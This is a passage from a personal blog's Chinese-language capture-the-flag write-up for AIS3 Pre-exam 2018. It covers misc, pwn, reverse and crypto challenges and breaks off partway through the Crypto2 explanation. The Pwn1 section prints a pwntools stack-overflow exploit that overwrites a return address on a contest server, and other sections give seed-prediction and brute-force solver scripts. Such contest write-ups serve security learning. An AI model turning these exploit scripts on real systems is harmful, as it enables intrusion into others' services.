



<!DOCTYPE html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.5, mkdocs-material-2.9.2">
    
    
      
        <title>Pre-exam - Lys0829's blog</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/application.ba0fd1a6.css">
      
        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.6079476c.css">
      
      
        
        
        <meta name="theme-color" content="#4caf50">
      
    
    
      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="green" data-md-color-accent="green">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
    viewBox="0 0 416 448" id="__github">
  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
        99.5z" />
</svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#ais3-pre-exam-2018" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../../.." title="Lys0829's blog" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                Lys0829's blog
              </span>
              <span class="md-header-nav__topic">
                Pre-exam
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  


  <a href="https://github.com/lys0829/lys0829.github.io/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#__github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      lys0829/lys0829.github.io
    </div>
  </a>

          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </span>
    Lys0829's blog
  </label>
  
    <div class="md-nav__source">
      


  


  <a href="https://github.com/lys0829/lys0829.github.io/" title="Go to repository" class="md-source" data-md-source="github">
    
      <div class="md-source__icon">
        <svg viewBox="0 0 24 24" width="24" height="24">
          <use xlink:href="#__github" width="24" height="24"></use>
        </svg>
      </div>
    
    <div class="md-source__repository">
      lys0829/lys0829.github.io
    </div>
  </a>

    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      CTFWriteUp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        CTFWriteUp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1" type="checkbox" id="nav-2-1" checked>
    
    <label class="md-nav__link" for="nav-2-1">
      2018
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-2-1">
        2018
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-1-1" type="checkbox" id="nav-2-1-1" checked>
    
    <label class="md-nav__link" for="nav-2-1-1">
      AIS3
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-2-1-1">
        AIS3
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Pre-exam
      </label>
    
    <a href="./" title="Pre-exam" class="md-nav__link md-nav__link--active">
      Pre-exam
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#misc1" title="Misc1" class="md-nav__link">
    Misc1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc2" title="Misc2" class="md-nav__link">
    Misc2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc3" title="Misc3" class="md-nav__link">
    Misc3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn1" title="Pwn1" class="md-nav__link">
    Pwn1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse1" title="Reverse1" class="md-nav__link">
    Reverse1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse2" title="Reverse2" class="md-nav__link">
    Reverse2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto1" title="Crypto1" class="md-nav__link">
    Crypto1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto2" title="Crypto2" class="md-nav__link">
    Crypto2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web1" title="Web1" class="md-nav__link">
    Web1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web2" title="Web2" class="md-nav__link">
    Web2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web3" title="Web3" class="md-nav__link">
    Web3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web4" title="Web4" class="md-nav__link">
    Web4
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#misc1" title="Misc1" class="md-nav__link">
    Misc1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc2" title="Misc2" class="md-nav__link">
    Misc2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#misc3" title="Misc3" class="md-nav__link">
    Misc3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn1" title="Pwn1" class="md-nav__link">
    Pwn1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse1" title="Reverse1" class="md-nav__link">
    Reverse1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reverse2" title="Reverse2" class="md-nav__link">
    Reverse2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto1" title="Crypto1" class="md-nav__link">
    Crypto1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto2" title="Crypto2" class="md-nav__link">
    Crypto2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web1" title="Web1" class="md-nav__link">
    Web1
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web2" title="Web2" class="md-nav__link">
    Web2
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web3" title="Web3" class="md-nav__link">
    Web3
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web4" title="Web4" class="md-nav__link">
    Web4
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/lys0829/lys0829.github.io/edit/master/CTFWriteUp/2018/AIS3/pre-exam/index.html" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <h1 id="ais3-pre-exam-2018">AIS3 Pre-exam 2018</h1>
<p>出題者好壞ww</p>
<h2 id="misc1">Misc1</h2>
<p>送分題，直接給flag</p>
<h2 id="misc2">Misc2</h2>
<p>一張jpg，裡面3個假flag
通常這種題目我都會先用binwalk看看，結果發現有zip，想說把它拿出來解壓縮，結果要密碼，本來想說是偽加密，把binary改一下應該就好了，結果改了還是打不開，就先放一邊
後來給了提示，說看看圖片裡假flag的下面，仔細一看，竟然是摩斯密碼......
<code>.- .. ... ...-- -.-- --- ..- ..-. .. -. -.. - ..... . .-. . .- .-.. ..-. .-.. .- --. --- .... -.-- . .- ....</code>
因為畫質不太好，有些可能有看錯，稍微腦補一下
Flag:<code>AIS3{YOUFINDTHEREALFLAGOHYEAH}</code></p>
<h2 id="misc3">Misc3</h2>
<p><a href="http://www.petitcolas.net/steganography/mp3stego/">MP3stego</a>直接用就有了</p>
<h2 id="pwn1">Pwn1</h2>
<p>有一個function會輸出flag
可以輸入兩個字串，是用gets，多的東西就直接從stack蓋過去了，所以就把main的return address蓋成輸出flag的function就行了
explotion:</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;104.199.235.135&quot;</span><span class="p">,</span><span class="mi">2111</span><span class="p">)</span>
<span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400797</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">840</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
<span class="k">print</span> <span class="n">payload</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>


<h2 id="reverse1">Reverse1</h2>
<p>直接ctrl+F，找<code>AIS3{</code>，就會找到，但是有一堆假的</p>
<h2 id="reverse2">Reverse2</h2>
<p>直接用IDA pro decompile，看到這樣的東西:</p>
<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">init</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+Ch] [bp-4h]@1</span>

  <span class="n">srand</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">84</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;&gt;=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>

<span class="c1">//----- (0000000000000930) ----------------------------------------------------</span>
<span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@10</span>
  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rsi@10</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+4h] [bp-1Ch]@7</span>
  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+8h] [bp-18h]@3</span>
  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [sp+Ch] [bp-14h]@7</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [sp+10h] [bp-10h]@1</span>
  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [sp+18h] [bp-8h]@1</span>

  <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">);</span>
  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;/tmp/secret&quot;</span><span class="p">,</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
  <span class="n">init</span><span class="p">();</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;========== WELCOME TO MY MIND ==========&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Try to find out secret in my mind!!!&quot;</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">cnt</span> <span class="o">!=</span> <span class="mi">85</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&quot;%d&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">2018</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">!=</span> <span class="n">v5</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Get out!!! You don&#39;t know me.&quot;</span><span class="p">);</span>
      <span class="k">goto</span> <span class="n">LABEL_10</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">secret</span><span class="p">[</span><span class="n">cnt</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v5</span><span class="p">;</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Nice try! Next one.&quot;</span><span class="p">);</span>
    <span class="o">++</span><span class="n">cnt</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">84</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
    <span class="n">fputc</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">stream</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;You know the flag~~~&quot;</span><span class="p">);</span>
<span class="nl">LABEL_10</span><span class="p">:</span>
  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v9</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>關鍵在srand(0)，這代表不是隨機，所以就寫一個一樣的就好</p>
<div class="codehilite"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;bits/stdc++.h&gt;</span><span class="cp"></span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">srand</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="mi">84</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="mi">2018</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>直接<code>$ ./exploit | ./secret</code></p>
<h2 id="crypto1">Crypto1</h2>
<p>POW
proof of work</p>
<div class="codehilite"><pre><span></span>==================== proof of work ====================
please give me an x satisfying the following condition
condition : x[:6] == &#39;0H1O4K&#39; and hashlib.sha256(x).hexdigest()[:6] == &#39;000000&#39;
x =
</pre></div>


<p>前綴每次都不同
就真的是proof of work，直接硬幹</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;104.199.235.135&quot;</span><span class="p">,</span><span class="mi">20000</span><span class="p">)</span>

<span class="n">dic</span> <span class="o">=</span> <span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>

<span class="n">suffix</span> <span class="o">=</span> <span class="s2">&quot;5KAJTC&quot;</span>
<span class="c1">#suffix = raw_input();</span>
<span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;28KVRZ9JZ1&quot;</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">text</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">suffix</span> <span class="o">=</span> <span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">22</span><span class="p">:])[:</span><span class="mi">6</span><span class="p">]</span>
<span class="c1">#condition : x[:6] == &#39;GZLXFZ&#39; and hashlib.sha256(x).hexdigest()[:6] == &#39;000000&#39;</span>
<span class="k">print</span> <span class="n">suffix</span>
<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;= &quot;</span><span class="p">)</span>


<span class="n">s</span> <span class="o">=</span> <span class="n">suffix</span><span class="o">+</span><span class="n">prefix</span>
<span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span>

<span class="n">ok</span> <span class="o">=</span> <span class="bp">False</span>

<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">36</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">36</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">36</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">36</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">ok</span><span class="p">:</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">36</span><span class="p">):</span>
                    <span class="n">prefix</span> <span class="o">=</span> <span class="n">dic</span><span class="p">[</span><span class="n">a</span><span class="p">]</span><span class="o">+</span><span class="n">dic</span><span class="p">[</span><span class="n">b</span><span class="p">]</span><span class="o">+</span><span class="n">dic</span><span class="p">[</span><span class="n">c</span><span class="p">]</span><span class="o">+</span><span class="n">dic</span><span class="p">[</span><span class="n">d</span><span class="p">]</span><span class="o">+</span><span class="n">dic</span><span class="p">[</span><span class="n">e</span><span class="p">]</span>
                    <span class="n">s</span> <span class="o">=</span> <span class="n">suffix</span><span class="o">+</span><span class="n">prefix</span>
                    <span class="nb">hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">6</span><span class="p">]</span>
                    <span class="c1">#print hash</span>
                    <span class="k">if</span> <span class="nb">hash</span> <span class="o">==</span><span class="s1">&#39;000000&#39;</span><span class="p">:</span>
                        <span class="k">print</span> <span class="n">s</span>
                        <span class="n">ok</span> <span class="o">=</span> <span class="bp">True</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>


<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>


<h2 id="crypto2">Crypto2</h2>
<p>XOR
這好像是我第一次這麼認真解crypto吧，以前大概都直接跳過
題目給了兩個檔案，加密後的東西跟加密程式
encrypt:</p>
<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">assert</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AIS3{&#39;</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">extend</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">L</span><span class="p">):</span>
    <span class="n">kL</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">key</span> <span class="o">*</span> <span class="p">(</span><span class="n">L</span> <span class="o">//</span> <span class="n">kL</span><span class="p">)</span> <span class="o">+</span> <span class="n">key</span><span class="p">[:</span><span class="n">L</span> <span class="o">%</span> <span class="n">kL</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">X</span><span class="p">,</span> <span class="n">Y</span><span class="p">)])</span>

<span class="n">key</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">plain</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">key</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">extend</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag-encrypted&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">data</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
</pre></div>


<p>觀察後會發現，它的加密方式是先隨機產一個key，長度是8~12隨機選，然後會把flag跟key放在一起當成被加密的原文，然後加密的key則是透過重複接好幾次來變成跟原文一樣長，然後做xor得到密文
